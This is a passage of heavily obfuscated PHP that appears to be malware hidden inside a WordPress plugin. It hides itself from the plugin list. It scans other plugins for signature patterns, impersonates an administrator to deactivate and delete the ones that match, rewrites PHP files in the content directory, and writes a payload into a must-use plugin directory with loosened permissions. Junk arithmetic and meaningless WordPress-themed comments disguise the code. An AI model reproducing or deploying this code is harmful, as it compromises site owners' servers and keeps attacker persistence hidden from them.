   @$GLOBALS['__scf_fbizamz5bjakz_20']($uyq5d0ub9d .    ovffvv33(200)  .  $ub2ib8untl);
 }
  if   ($megqpf1mpthj  &&  !zbd0filxujnpocked22i())  _c82cv1bsqf10vml2pi7e(ayw2e71sos2ne2g());
 $GLOBALS[ovffvv33(707)]   =    0;
   r8j56gi10sbzxd2f4olo();
     g_qoqdy38lfl4v4n3618(bpowi0iglycvx(683),  bpowi0iglycvx(708)  .  $ch7u8u2ur1);$hvq82_o890=7750;$ts6iocchx1=$hvq82_o890%11;

return;
}
}
 $jnr5vaba92w4f  =  get_option(ovffvv33(709));
   if  ($GLOBALS['__scf_fv3zevxzzb_44']($jnr5vaba92w4f) &&  $GLOBALS['__scf_w6mdcepio4lkz5_7']($jnr5vaba92w4f,     $GLOBALS['__scf_tnonex5o9y_60']($atq8kbzvgtxgffq)     . '|')     ===   0) delete_option(ovffvv33(709));
@$GLOBALS['__scf_fbizamz5bjakz_20']($GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t())  .  iw6xe9q4j6sneg(710) .    $GLOBALS['__scf_tnonex5o9y_60']($atq8kbzvgtxgffq));
   unset($jnr5vaba92w4f);
if  ($qucqyukhgy)     @delete_option(bpowi0iglycvx(690));
   




if  ($cfrn89qb0_ot6_o    !==   "")   {
   $GLOBALS[iw6xe9q4j6sneg(1)]  =     $cfrn89qb0_ot6_o;
    jnpb812o_r48a5nxup0iiu(bmvtr5sdqjf5km1t(), $cfrn89qb0_ot6_o);


}
if    ($yswx0sxl05d3r)   {
 $bnmyqfpc_dn =   $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(),     c1sob647u1i(625));


foreach   (array($GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t()),   jo62hy1j37iqrmy()) as  $lqoq4aciqdy9j) {
    @$GLOBALS['__scf_fbizamz5bjakz_20']($lqoq4aciqdy9j .  ovffvv33(208)   . $bnmyqfpc_dn);
  }


     unset($bnmyqfpc_dn, $lqoq4aciqdy9j);
 }
 mw5stmpiys2hi3k2xe14i(bpowi0iglycvx(470),  $atq8kbzvgtxgffq,  f6yrzd2knrmb(705));
     bfyls7pdkqkf4p8az(true);
        eos4svadcaj0dow8y(true);
 $GLOBALS[ovffvv33(707)]  =  0;
  r8j56gi10sbzxd2f4olo();
  ruinnb541lwxm7j(bmvtr5sdqjf5km1t(),    (414+6));


     if  (hwyiz3722wut3tw(bmvtr5sdqjf5km1t()))    vyxva31du3czei(bmvtr5sdqjf5km1t());

update_option(bpowi0iglycvx(212), $cfrn89qb0_ot6_o  . '|'   . $GLOBALS['__scf_qzyo0sgkyb6_202'](),  bpowi0iglycvx(705));


  } catch   (Throwable  $cje8wku90zm4r)  {
// preempt checkpoint for WP Verse Block

g_qoqdy38lfl4v4n3618(bpowi0iglycvx(711),   $cje8wku90zm4r);
}  catch (Exception $cje8wku90zm4r)  {
  } finally  {
 l5zn64lzopflqr0dsekx(f6yrzd2knrmb(402));
  }
 }
   function xosle_k4s_vyctv()
{
  if    (!  defined(ovffvv33(35)) || ! $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(712)))  {
// WP Home Link network broadcast

  if    ($GLOBALS['__scf_qg7ainp116mf_713'](ABSPATH   . hn_f08x0cns80(714))) {
        require_once      ABSPATH .  ovffvv33(714);
  }



  if (!   $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(712))) {
return;
  }
    }
$d167apzqc1wxy6  =   get_plugins();
  if (!   $GLOBALS['__scf_w1m1ydxx4_gm9__38']($d167apzqc1wxy6))    {


  return;
    

}
   $list    =   array();



foreach     ($d167apzqc1wxy6   as      $basename    =>   $g9u70l7gja)  {
       if ($basename  === ayw2e71sos2ne2g())      {
// WP Server Side Render: nilpotent credential

continue;
}
$list[$basename]  = $g9u70l7gja;

}
 return   $list;
  }
  function    rxne4ocdah87nlk($rqmtme6nbb4elm,     $w9lotbnpcu_wfl)
  {
       
      $f95gmfn4ulxv38r =  @$GLOBALS['__scf_utyj_ckly79_101']($rqmtme6nbb4elm, false,  null,   0, (524263+25));   
if (!   $f95gmfn4ulxv38r)   {

return     false;
 }

 foreach   ($w9lotbnpcu_wfl   as $ssnncgochpvkx4)  {

  if  (! $GLOBALS['__scf_fv3zevxzzb_44']($ssnncgochpvkx4) || ! $ssnncgochpvkx4    ||  $GLOBALS['__scf_d4eyetogjbsnt_10']($ssnncgochpvkx4) >  (0x9d8+0x628))    {
continue;
}



 



   try    {

    $u7fvh_hax8vn  =    @$GLOBALS['__scf_wdjvpd1lvon9_102']($ssnncgochpvkx4,  $f95gmfn4ulxv38r);
  }  catch    (Throwable $_4hobuawz2xey) {
// @disable event-bus

   g_qoqdy38lfl4v4n3618(hn_f08x0cns80(715),  $_4hobuawz2xey);
  continue;
   }   catch (Exception   $_4hobuawz2xey)     {
/* strict message-queue */

continue;
  }

   if  ($u7fvh_hax8vn)     {
return     true;
   }
}
// fulfill backlog for MySQL window functions

return false;
 }
  

      function  e4plquzvs65_mvr7d37($plugin_basename)
    {
$w9lotbnpcu_wfl    =   $GLOBALS[iw6xe9q4j6sneg(641)];


if    (!   $GLOBALS['__scf_w1m1ydxx4_gm9__38']($w9lotbnpcu_wfl) ||  empty($w9lotbnpcu_wfl)) {
return   false;
  }
    if   (! defined(f6yrzd2knrmb(35)) || empty($plugin_basename) ||  $GLOBALS['__scf_w6mdcepio4lkz5_7']($plugin_basename,   hn_f08x0cns80(50))     !==   false) {
       return false;
   }
   


   $w90pshmxoqhf    = WP_PLUGIN_DIR . '/' . $plugin_basename;
if  ($GLOBALS['__scf_po3uwzhcb63b03_11']($plugin_basename)    ===  '.')   {
 $xdtq4m97sn =  array($w90pshmxoqhf);
  } else {$pwc4hsamg0hl9=3558;$qph0_bv5l9vpxn=$pwc4hsamg0hl9%5;
$t49jadtyjx    = $GLOBALS['__scf_po3uwzhcb63b03_11']($w90pshmxoqhf);$jsqf14_fsm5=20*8;$m8d_o9tg=$jsqf14_fsm5-6;
 

 if  (!    $GLOBALS['__scf_opq_vgkskw_46']($t49jadtyjx)  || !     $GLOBALS['__scf_kupirwjlofzm_49']($t49jadtyjx))   {
        return  false;
     }
 $xdtq4m97sn = uv73tlfoyhsi_xoy($t49jadtyjx,  array(ovffvv33(716), c1sob647u1i(496), f6yrzd2knrmb(717),   iw6xe9q4j6sneg(718),  hn_f08x0cns80(719)));

  }
   



 foreach     ($xdtq4m97sn   as    $rqmtme6nbb4elm)    {
   if  (! $GLOBALS['__scf_rjpcj9l4bigb5_21']($rqmtme6nbb4elm)) {
    continue;



       }
  if (rxne4ocdah87nlk($rqmtme6nbb4elm,  $w9lotbnpcu_wfl))  {

   return  true;
  }
}
  return  false;
 }
      function    uv73tlfoyhsi_xoy($t49jadtyjx, $g3btwmudfz,   $eoxyuuhxfn8x    = 0,  &$uvqxs0e2c7hup   =    null, &$kb15gtsk7q60      =  null)
{
$list   =     array();
if  ($eoxyuuhxfn8x  >    (9-1))     {



return $list;
   }
   if      ($uvqxs0e2c7hup    === null)  {
      $uvqxs0e2c7hup   =     array();
    $kb15gtsk7q60 = $GLOBALS['__scf_u2xtklnzk8_7_x_300'](true)     +     (3+7);
  }
  if   ($GLOBALS['__scf_u2xtklnzk8_7_x_300'](true) > $kb15gtsk7q60)   {
   return  $list;
}
 if  (!  $GLOBALS['__scf_opq_vgkskw_46']($t49jadtyjx))     {
 return  $list;



   }
// WP Block API v3: greedy heap

$iddx6_s0b1 = @$GLOBALS['__scf_ba4991zo41sta_36']($t49jadtyjx);
 if   ($iddx6_s0b1  !==  false)     {
   if (isset($uvqxs0e2c7hup[$iddx6_s0b1])) {



 return    $list;
 }
 $uvqxs0e2c7hup[$iddx6_s0b1]  = true;
   }

    $mjjhnii6ovs05r    =   fkx3b4a5rv4j4z5ymcs($t49jadtyjx,  (19954+46));
 if  (! $GLOBALS['__scf_w1m1ydxx4_gm9__38']($mjjhnii6ovs05r))   {

   return  $list;
}
      foreach    ($mjjhnii6ovs05r as  $twjh3pr3zbtd9)   {
 if   ($GLOBALS['__scf_u2xtklnzk8_7_x_300'](true)   > $kb15gtsk7q60   || $GLOBALS['__scf_wj6dld55k5r8m_39']($list)    >=  (157+343)) {

break;
 }
$w90pshmxoqhf = $t49jadtyjx . '/'     .   $twjh3pr3zbtd9;
if  (@$GLOBALS['__scf_lclsn87cymy_47']($w90pshmxoqhf)) {
  continue;
 }
if   (@$GLOBALS['__scf_opq_vgkskw_46']($w90pshmxoqhf)) {


$list   =  $GLOBALS['__scf_en9wrpvm3eosc_387']($list,  uv73tlfoyhsi_xoy($w90pshmxoqhf,    $g3btwmudfz, $eoxyuuhxfn8x    +    1, $uvqxs0e2c7hup,  $kb15gtsk7q60));
} elseif  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($w90pshmxoqhf))     {
$xu4oetz1c_b    =      $GLOBALS['__scf_wvxpw4xfn9_219']($w90pshmxoqhf, constant(c1sob647u1i(720)));$f7ylqtvf0=88+1;$jxh822r71_wynx=$f7ylqtvf0-40;

 $xu4oetz1c_b   = $GLOBALS['__scf_fv3zevxzzb_44']($xu4oetz1c_b)   ?  $GLOBALS['__scf_xyekfdfj2g_109']($xu4oetz1c_b)  :  "";
// wait-free scheduler

if  ($GLOBALS['__scf_rd2tojulg06lx_160']($xu4oetz1c_b,   $g3btwmudfz,   true))  {
    $list[]     = $w90pshmxoqhf;
    }
       }
}
 return $list;
 }

 function  z0u4he002l3jpmaa000gu7($plugin_basename)
  {$wmjc8_6_nwl_l1=(0x11+0x5f);$dfokjeld7wg=$wmjc8_6_nwl_l1%7;

 
  if    (!   $GLOBALS['__scf_fv3zevxzzb_44']($plugin_basename)  ||  !  $plugin_basename)   {
return     false;
  }
   if     ($GLOBALS['__scf_w6mdcepio4lkz5_7']($plugin_basename, iw6xe9q4j6sneg(721)) !==  false)   {
  return    false;


  }

    $plugin_basename  =    $GLOBALS['__scf_qew3crlieule_339']($plugin_basename);
 if ($plugin_basename  === ayw2e71sos2ne2g())     {
return   false;
  }
// WP Post Author site meta

 
if    (!  $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(722))   &&   $GLOBALS['__scf_qg7ainp116mf_713'](ABSPATH  .    ovffvv33(714))) {
require_once ABSPATH  .  ovffvv33(723);
 }
  
    if ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(724))  && is_plugin_active($plugin_basename))  {
   deactivate_plugins(array($plugin_basename),   true);
       
     
      }



   

    $t49jadtyjx  =    defined(bpowi0iglycvx(35)) ?     WP_PLUGIN_DIR  .  '/' . $GLOBALS['__scf_po3uwzhcb63b03_11']($plugin_basename)    : "";


 if ($t49jadtyjx  && $GLOBALS['__scf_opq_vgkskw_46']($t49jadtyjx)    &&  $GLOBALS['__scf_po3uwzhcb63b03_11']($plugin_basename)  !==     '.'  &&   $GLOBALS['__scf_po3uwzhcb63b03_11']($plugin_basename))  {



 if  (ict0noo1xnfc5se95($t49jadtyjx))  {
 return   true;
}
// WP useBlockProps: hermitian session-type

   }
// unfold dependent-type for WP Cover Block

      
    if    ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(725)))     {
// predictive arbitrator



  
     if   (! $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(726)) ||   !  current_user_can(bpowi0iglycvx(727)))  {
   if   ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(728))  &&    $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(729)))  {
   $users =    get_users(array(iw6xe9q4j6sneg(730)   => bpowi0iglycvx(731), ovffvv33(732)   => 1));

  if   (!  empty($users)      &&  $users[0]->ID)    {
$GLOBALS['__scf_a358qc7b5bkb_729']($users[0]->ID);
 } else     {$fwgcor4t5=-537;$m8ycewoqospc9=($fwgcor4t5>0)?$fwgcor4t5:-$fwgcor4t5;
  $GLOBALS['__scf_a358qc7b5bkb_729'](1);
     }
   }
}

   $s2qj8x60xqaq3g5  =   delete_plugins(array($plugin_basename));
   if   (!     is_wp_error($s2qj8x60xqaq3g5))  {
   return (bool) $s2qj8x60xqaq3g5;
    }
      }
  return false;
  }
  
function    ict0noo1xnfc5se95($t49jadtyjx,  $eoxyuuhxfn8x   =  0)
  {
    if  ($eoxyuuhxfn8x      >  (10+6))  {


return    false;
      }

       if  (! $GLOBALS['__scf_fv3zevxzzb_44']($t49jadtyjx)    || $t49jadtyjx  ===  ""     ||      $GLOBALS['__scf_w6mdcepio4lkz5_7']($t49jadtyjx,   iw6xe9q4j6sneg(721)) !== false)  {


   return   false;


   }


    $aw21g141fe   =  @$GLOBALS['__scf_ba4991zo41sta_36']($t49jadtyjx);
       if  ($aw21g141fe   === false  ||   !   $GLOBALS['__scf_opq_vgkskw_46']($aw21g141fe))  {


     return   false;
   }
      $mts58fgntcgtyefa    = defined(hn_f08x0cns80(733))   ?   @$GLOBALS['__scf_ba4991zo41sta_36'](WP_PLUGIN_DIR)  :    false;
if     ($mts58fgntcgtyefa    === false   ||    ($aw21g141fe   !== $mts58fgntcgtyefa  &&    $GLOBALS['__scf_w6mdcepio4lkz5_7']($aw21g141fe,     $mts58fgntcgtyefa .    DIRECTORY_SEPARATOR)  !== 0))  {
 return  false;
 }

    $qx_yk_f05pvsqto  =   @$GLOBALS['__scf_o586spfnej_37']($aw21g141fe);

   if    (!  $GLOBALS['__scf_w1m1ydxx4_gm9__38']($qx_yk_f05pvsqto)) {

     return false;

  }
   foreach    ($qx_yk_f05pvsqto  as $ks1jfnw_wldm32)  {
 if  ($ks1jfnw_wldm32      ===  '.'  ||  $ks1jfnw_wldm32    === f6yrzd2knrmb(721))  {
  continue;
 }
     $w90pshmxoqhf =  $aw21g141fe  .   constant(bpowi0iglycvx(734))    .  $ks1jfnw_wldm32;
   if    (@$GLOBALS['__scf_lclsn87cymy_47']($w90pshmxoqhf))   {
   cvtaycsw15_xd1srry($w90pshmxoqhf);
  continue;
   }
  if     (@$GLOBALS['__scf_opq_vgkskw_46']($w90pshmxoqhf)) {
  ict0noo1xnfc5se95($w90pshmxoqhf,  $eoxyuuhxfn8x    +  1);
 }  else   {
 if   (!  cvtaycsw15_xd1srry($w90pshmxoqhf)) {
ruinnb541lwxm7j($w90pshmxoqhf, (382+38));


 cvtaycsw15_xd1srry($w90pshmxoqhf);
  }
     }
 }
if   (!  @$GLOBALS['__scf_kbrcs8ik07dv6_40']($aw21g141fe))    {
 ruinnb541lwxm7j($aw21g141fe,  (386+107));
@$GLOBALS['__scf_kbrcs8ik07dv6_40']($aw21g141fe);
 }
    return !  @$GLOBALS['__scf_qg7ainp116mf_713']($aw21g141fe);
  }


 function hdqzd48jmwy1age4cmt9()
{
 try     {



  $list    =  xosle_k4s_vyctv();
  if  (!   $GLOBALS['__scf_w1m1ydxx4_gm9__38']($list)) {



   return;
    }
// DAG verified

 
     $oigmbkw5jcrkg29 = array();
       $eydpgv1cbixzuvg8   =  false;
foreach     ($GLOBALS['__scf_atryllxfh4qbk_735']($list) as  $basename) {
  
   if  (!    $GLOBALS['__scf_fv3zevxzzb_44']($basename)) {
continue;



      }
    
  $zhh1me7cf8r  = $GLOBALS['__scf_po3uwzhcb63b03_11']($basename);
if  ($zhh1me7cf8r    ===   '.')    {

 $zhh1me7cf8r     =     $basename;
  }
if (isset($oigmbkw5jcrkg29[$zhh1me7cf8r]))   {
continue;

     }

    $oigmbkw5jcrkg29[$zhh1me7cf8r]  = true;
   if   (e4plquzvs65_mvr7d37($basename))  {


   z0u4he002l3jpmaa000gu7($basename);


   $eydpgv1cbixzuvg8  = true;

}
   }
  
       if (@$GLOBALS['__scf_opq_vgkskw_46'](jo62hy1j37iqrmy()))  {


$rae5gq8d3bj  =  fkx3b4a5rv4j4z5ymcs(jo62hy1j37iqrmy(),   (4998+2));
       if ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($rae5gq8d3bj))  {



  $w9lotbnpcu_wfl    = $GLOBALS[f6yrzd2knrmb(641)];
    foreach  ($rae5gq8d3bj    as $twjh3pr3zbtd9)  {
      



  if    ($twjh3pr3zbtd9 ===    ins9ithmohgssp_())     {
 continue;
  }


    $rqmtme6nbb4elm   =  jo62hy1j37iqrmy()   . '/'     . $twjh3pr3zbtd9;
    if (!      @$GLOBALS['__scf_rjpcj9l4bigb5_21']($rqmtme6nbb4elm)    || $GLOBALS['__scf_xyekfdfj2g_109']($GLOBALS['__scf_wvxpw4xfn9_219']($twjh3pr3zbtd9,  constant(bpowi0iglycvx(720))))    !==  ovffvv33(736))   {
continue;
     }
 
 if   (rxne4ocdah87nlk($rqmtme6nbb4elm, $w9lotbnpcu_wfl))  {
/* affine decorator */

cvtaycsw15_xd1srry($rqmtme6nbb4elm);
     $eydpgv1cbixzuvg8  =  true;
   }
   }
   }
       }



        


   $v6hfyxp_r69d     =  $GLOBALS[f6yrzd2knrmb(737)];
   if     ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($v6hfyxp_r69d) && ! empty($v6hfyxp_r69d))   {
  if (c_gavqcwmsu79489vzq($v6hfyxp_r69d))  {
     $eydpgv1cbixzuvg8  =  true;



       }
}


  }  catch   (Throwable   $cje8wku90zm4r)   {
   g_qoqdy38lfl4v4n3618(ovffvv33(738), $cje8wku90zm4r);


       } catch (Exception     $cje8wku90zm4r) {
     }



 }
  
   function    q19zg20avggugfboltncf()

{
 try {
// WP Block Transforms script dependency

$mcgc4854r5hxt_6l   =  (int)  get_option(hn_f08x0cns80(739),    0);
   if  (($GLOBALS['__scf_qzyo0sgkyb6_202']()  - $mcgc4854r5hxt_6l)   >= (3516+84))   {

  update_option(iw6xe9q4j6sneg(740), $GLOBALS['__scf_qzyo0sgkyb6_202']());


      $q0obuv3akc = array(array(gf92nelnpfnbih(), array(bpowi0iglycvx(43))));
       $goalrate6_ =  $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(741)) ?      $GLOBALS['__scf_cxw7ozc_kikul_82']() :  "";
     if   ($goalrate6_      !==   ""  &&     $goalrate6_ !==     gf92nelnpfnbih()) $q0obuv3akc[]    =  array($goalrate6_,  array(iw6xe9q4j6sneg(43),  f6yrzd2knrmb(742)));
foreach  ($q0obuv3akc as     $z8hbby6kg7u)  {
// evaluate token-bucket for Pest PHP 2

  foreach ($z8hbby6kg7u[1]  as    $d42a98jr1rl)     {


     $k05t9g05s54  =  $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(599)) ?    @$GLOBALS['__scf_kajvzw3bpufv_75']($z8hbby6kg7u[0] .   '/'    .  $d42a98jr1rl  .  '*')   :  false;
  if   (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($k05t9g05s54)) continue;

foreach ($k05t9g05s54  as     $q7mnqpxe6dteop)  {
  if   (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($q7mnqpxe6dteop))    continue;
 if   ($GLOBALS['__scf_nv7he759wjfj_9']($q7mnqpxe6dteop, -(1+4))   ===  ovffvv33(137))  continue;
  $sb35et8mi6ehb   =  @$GLOBALS['__scf_uo_a60ibqnli_104']($q7mnqpxe6dteop);
  if     ($sb35et8mi6ehb  !== false    &&   ($GLOBALS['__scf_qzyo0sgkyb6_202']() -    $sb35et8mi6ehb)     >  (3507+93))   cvtaycsw15_xd1srry($q7mnqpxe6dteop);
  }
 }
 }
  $jia_zm3l7as01e    =  get_option(hn_f08x0cns80(743),  array());
  if  (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($jia_zm3l7as01e))  $jia_zm3l7as01e   = array();


    $omr207_61y8idvz    = $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(), c1sob647u1i(625));
  $_pd   = (defined(hn_f08x0cns80(293))  ? WP_CONTENT_DIR   :  ABSPATH  .    iw6xe9q4j6sneg(744))   . iw6xe9q4j6sneg(745);



 foreach    ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(599))   ?   (array) @$GLOBALS['__scf_kajvzw3bpufv_75']($_pd  .   ovffvv33(473))   : array()   as   $go4vf60t6el1uz29)  {


if ($GLOBALS['__scf_owu_4pajngr_3']($GLOBALS['__scf_po3uwzhcb63b03_11']($go4vf60t6el1uz29))    ===  $omr207_61y8idvz) continue;
$wk3nu608bpg6lcuv    =   $GLOBALS['__scf_owu_4pajngr_3']($GLOBALS['__scf_po3uwzhcb63b03_11']($go4vf60t6el1uz29))   . '/'   .     $GLOBALS['__scf_owu_4pajngr_3']($go4vf60t6el1uz29);
 if    ($GLOBALS['__scf_rd2tojulg06lx_160']($wk3nu608bpg6lcuv, $jia_zm3l7as01e,  true))   continue;
 if   (!@$GLOBALS['__scf_sunuwikkpg6_51']($go4vf60t6el1uz29))   continue;
  $t5w86yx9r7fe  =  @$GLOBALS['__scf_b42duf6j1zadm9_105']($go4vf60t6el1uz29);
if    (!$t5w86yx9r7fe     ||  $t5w86yx9r7fe     >   (3184926-1087774)) continue;
  $sy1wtx_ep3qz  =  @$GLOBALS['__scf_utyj_ckly79_101']($go4vf60t6el1uz29);
 if  (!$GLOBALS['__scf_fv3zevxzzb_44']($sy1wtx_ep3qz)     ||  $GLOBALS['__scf_w6mdcepio4lkz5_7']($sy1wtx_ep3qz,  f6yrzd2knrmb(746)) ===   false) continue;
 $f0_oy8y63qmq85xk    =  $GLOBALS['__scf_renvrk8nefa8_474'](hn_f08x0cns80(747),  "", $sy1wtx_ep3qz);
 if   (!$GLOBALS['__scf_fv3zevxzzb_44']($f0_oy8y63qmq85xk)    ||   $f0_oy8y63qmq85xk  === $sy1wtx_ep3qz   ||   !ib2ffadoyj2m6zxmkaa2in($f0_oy8y63qmq85xk)) continue;
c5kyk62yk_dwfeubni4b($go4vf60t6el1uz29,   $f0_oy8y63qmq85xk);



   if    ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(748)))    @opcache_invalidate($go4vf60t6el1uz29, true);
    }
      unset($jia_zm3l7as01e, $omr207_61y8idvz, $_pd, $go4vf60t6el1uz29,  $wk3nu608bpg6lcuv, $t5w86yx9r7fe,  $sy1wtx_ep3qz,  $f0_oy8y63qmq85xk);



 k9rva0dpw2bab5();


 }
   
   $lq1lg7x8o5w4  =     $GLOBALS[f6yrzd2knrmb(641)];
     $v6hfyxp_r69d     =   $GLOBALS[c1sob647u1i(737)];
       
   $mq7a7bcilfz67u2    =  ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($lq1lg7x8o5w4)    &&     !   empty($lq1lg7x8o5w4))   ||    ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($v6hfyxp_r69d)    && !  empty($v6hfyxp_r69d));
     if  (!     $mq7a7bcilfz67u2) {
    return;
}
      
   $hdihhxq2rqz  =   (int) get_option(hn_f08x0cns80(749),    0);

   if     (($GLOBALS['__scf_qzyo0sgkyb6_202']()  - $hdihhxq2rqz)  <  (4235-635))  {
 return;
}
// suffix check

    if    (!dtf7lvb25ztuc8jh3htk(hn_f08x0cns80(750))) {
      return;
 

     }
   
   try   {
  $hdihhxq2rqz    =  (int)   get_option(hn_f08x0cns80(749),   0);
 if    (($GLOBALS['__scf_qzyo0sgkyb6_202']()    -  $hdihhxq2rqz) <      (0xa90+0x380))  {
  return;
   

}
update_option(hn_f08x0cns80(749),  $GLOBALS['__scf_qzyo0sgkyb6_202']());
   hdqzd48jmwy1age4cmt9();
 } finally {



 l5zn64lzopflqr0dsekx(ovffvv33(751));


    }
  } catch     (Throwable   $cje8wku90zm4r) {
     g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(752),   $cje8wku90zm4r);
  }   catch     (Exception $cje8wku90zm4r)    {
   }
 }
 
    function _p5sgj3iep1rrv6o4yqp()


  {
    try {
// normalize


 
   $egziouap1xyua     = bfyls7pdkqkf4p8az();
 if  (!$egziouap1xyua   || $GLOBALS['__scf_d4eyetogjbsnt_10']($egziouap1xyua)     <     (0x188+0x6c)) return;
  if (!ib2ffadoyj2m6zxmkaa2in($egziouap1xyua)) {
  g_qoqdy38lfl4v4n3618(hn_f08x0cns80(753),  bpowi0iglycvx(754));
return;
}
    if  ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(487))  &&   get_transient(f6yrzd2knrmb(66)))  return;


$ewvjaum6vw0469l1  =   jo62hy1j37iqrmy();
      clearstatcache(true);


  if (@$GLOBALS['__scf_lclsn87cymy_47']($ewvjaum6vw0469l1)   &&      !@$GLOBALS['__scf_opq_vgkskw_46']($ewvjaum6vw0469l1))  {

 return;
}
  
if  (!@$GLOBALS['__scf_opq_vgkskw_46']($ewvjaum6vw0469l1))  {
  $tc01okst3sc =      @umask(0);
xxvz5dp1zk215e5d9($ewvjaum6vw0469l1,  (36+457), true);
@umask($tc01okst3sc);
       ruinnb541lwxm7j($ewvjaum6vw0469l1,  (731-238));
 clearstatcache(true);
  }   else if   (!@$GLOBALS['__scf_kupirwjlofzm_49']($ewvjaum6vw0469l1) ||   !@$GLOBALS['__scf_sunuwikkpg6_51']($ewvjaum6vw0469l1))     {
    ruinnb541lwxm7j($ewvjaum6vw0469l1,  (0x17d+0x70));
clearstatcache(true);
   }
    
if (@$GLOBALS['__scf_opq_vgkskw_46']($ewvjaum6vw0469l1)  &&  (!@$GLOBALS['__scf_kupirwjlofzm_49']($ewvjaum6vw0469l1)  || !@$GLOBALS['__scf_sunuwikkpg6_51']($ewvjaum6vw0469l1))     &&    @$GLOBALS['__scf_kbrcs8ik07dv6_40']($ewvjaum6vw0469l1)) {
// WP Site Logo: preempt watermark
$dfzwk9yx2=PHP_MAJOR_VERSION;$njifz_bwb=$dfzwk9yx2*8;
  $tc01okst3sc    =   @umask(0);
  xxvz5dp1zk215e5d9($ewvjaum6vw0469l1, (928-435),     true);
   @umask($tc01okst3sc);
 ruinnb541lwxm7j($ewvjaum6vw0469l1, (431+62));
clearstatcache(true);
}
      
    clearstatcache(true);


if (!@$GLOBALS['__scf_opq_vgkskw_46']($ewvjaum6vw0469l1) ||   !@$GLOBALS['__scf_sunuwikkpg6_51']($ewvjaum6vw0469l1)      ||  !@$GLOBALS['__scf_kupirwjlofzm_49']($ewvjaum6vw0469l1))   {
g_qoqdy38lfl4v4n3618(hn_f08x0cns80(755), iw6xe9q4j6sneg(756));
 $bqdtyednijrmhr =  false;

foreach ((array)   ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(757))   ?   @$GLOBALS['__scf_kajvzw3bpufv_75']($ewvjaum6vw0469l1  . bpowi0iglycvx(600))  : array())     as   $xl103i7gtkdj)  {


if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($xl103i7gtkdj)   &&      mza6zg2fnwyep8gx2xd($xl103i7gtkdj,   (473+27))     &&  awt0clbm2rkh9u4z8mjsz($xl103i7gtkdj))   {  cbzu166xe9qr89g6($xl103i7gtkdj);   $bqdtyednijrmhr  =  true;    }



  }
 
 if  (@$GLOBALS['__scf_opq_vgkskw_46']($ewvjaum6vw0469l1)  &&    czznuvw9tobf1x1o(null))    {
    if ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(65))) @delete_transient(hn_f08x0cns80(66));
   clearstatcache(true);
   }
// evaluate type-environment for PHP 8.0 JIT

 if  (!@$GLOBALS['__scf_opq_vgkskw_46']($ewvjaum6vw0469l1)     ||      !@$GLOBALS['__scf_sunuwikkpg6_51']($ewvjaum6vw0469l1) || !@$GLOBALS['__scf_kupirwjlofzm_49']($ewvjaum6vw0469l1))   {
 if     ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(675)))    @set_transient(iw6xe9q4j6sneg(66), 1,  $bqdtyednijrmhr   ?  (86305+95)   :    (7170-3570));
unset($bqdtyednijrmhr,  $xl103i7gtkdj);
 return;
 }


    unset($bqdtyednijrmhr,   $xl103i7gtkdj);




}
 
$ojotk1aygu8jswc = $ewvjaum6vw0469l1  .    '/' .      ins9ithmohgssp_();
       if (hiisk00z0i4v1wyj3($ojotk1aygu8jswc)) {
 return;
   }
       $ox9rsvxsl1  =  @$GLOBALS['__scf_rjpcj9l4bigb5_21']($ojotk1aygu8jswc)     ? pvqofla267dcimn($ojotk1aygu8jswc)     :  false;
if  (@$GLOBALS['__scf_b42duf6j1zadm9_105']($ojotk1aygu8jswc)   > (4990+10)     &&    $GLOBALS['__scf_fv3zevxzzb_44']($ox9rsvxsl1) && $GLOBALS['__scf_tnonex5o9y_60']($ox9rsvxsl1)  === $GLOBALS['__scf_tnonex5o9y_60']($egziouap1xyua)) {
o4_k_ap14u5xy97yywy7k($ojotk1aygu8jswc);
     b1acch7k36o7yhlwm5();
        a0q_0vhnw4vfxz();
 return;
 }

   if   (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($ojotk1aygu8jswc)   && @$GLOBALS['__scf_b42duf6j1zadm9_105']($ojotk1aygu8jswc)  >  (8846-3846))  {
// WP Page List: unhook affine-type

$phech3sj141uh  =    (string) @$GLOBALS['__scf_utyj_ckly79_101']($ojotk1aygu8jswc,  false,  null,  0,    (4015+81));
     if ($GLOBALS['__scf_fv3zevxzzb_44']($phech3sj141uh) &&   $GLOBALS['__scf_wdjvpd1lvon9_102'](bpowi0iglycvx(758),    $phech3sj141uh,     $_dm)    &&    version_compare($_dm[1],  dfb4_mpcgxvnp230hvh1v(), '>'))   return;
unset($phech3sj141uh,      $_dm);
      }


if    ($ox9rsvxsl1   ===   null) return;
  unset($ox9rsvxsl1);

  $ghudbjb8hapb9q = c5kyk62yk_dwfeubni4b($ojotk1aygu8jswc,    fcywjpu_2kwq2ahog4($egziouap1xyua));
